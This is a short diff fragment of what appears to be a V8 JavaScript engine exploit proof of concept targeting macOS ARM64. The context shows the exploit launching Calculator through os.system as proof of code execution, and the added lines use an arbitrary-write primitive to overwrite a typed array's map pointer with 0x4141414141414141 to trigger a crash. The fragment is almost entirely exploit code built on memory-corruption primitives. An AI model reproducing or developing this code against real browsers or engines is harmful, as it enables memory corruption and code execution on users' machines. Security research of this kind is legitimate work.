@@ -136,6 +136,11 @@ function main() {
     // Pop calculator (macOS ARM64)
     os.system("/usr/bin/open", ["/System/Applications/Calculator.app"]);
     print(`[+] Calculator launched`);
+    // === CRASH PoC: corrupt ta's map pointer → EXC_BAD_ACCESS ===
+    writeU64(cage_base_offset + 0x100n, 0x4141414141414141n);
+    print(`[CRASH] ta map → 0x4141414141414141`);
+    print(`[CRASH] triggering access...`);
+    ta.length;  // V8 reads map at 0x4141414141414141 → EXC_BAD_ACCESS
   } else {
     print("[-] Write failed: " + targetView.getUint32(0, true).toString(16));
   }
